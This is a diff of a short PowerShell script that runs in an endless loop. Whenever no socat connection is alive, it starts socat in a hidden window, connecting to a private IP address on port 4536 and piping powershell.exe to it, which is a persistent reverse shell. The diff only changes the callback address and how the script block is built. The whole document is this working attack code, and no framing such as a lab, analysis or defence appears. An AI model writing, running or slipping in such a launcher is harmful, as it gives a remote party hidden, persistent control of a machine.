@@ -1,14 +1,14 @@
-if(Get-Process -Name socat | ForEach-Object { Get-NetTCPConnection -OwningProcess $_.Id -ErrorAction SilentlyContinue } ){
+$scriptBlock = [Scriptblock]::Create(@'
+  if(Get-Process -Name socat | ForEach-Object { Get-NetTCPConnection -OwningProcess $_.Id -ErrorAction SilentlyContinue } ){
 	Write-Host "running,..."
 	Stop-Process -Name socat
 	
 	
 }else{
 	Write-Host "not running, bye bye..."	
-	powershell.exe -windowstyle hidden .\socat -d -d TCP4:192.168.100.25:4536 EXEC:'powershell.exe',pipes
+	powershell.exe -windowstyle hidden .\socat -d -d TCP4:192.168.1.14:4536 EXEC:'powershell.exe',pipes
 }
-'@
-$scriptBlock = [scriptblock]::Create($multilineScript)
+'@)
 while($true){
 
 Invoke-Command -ScriptBlock $scriptBlock
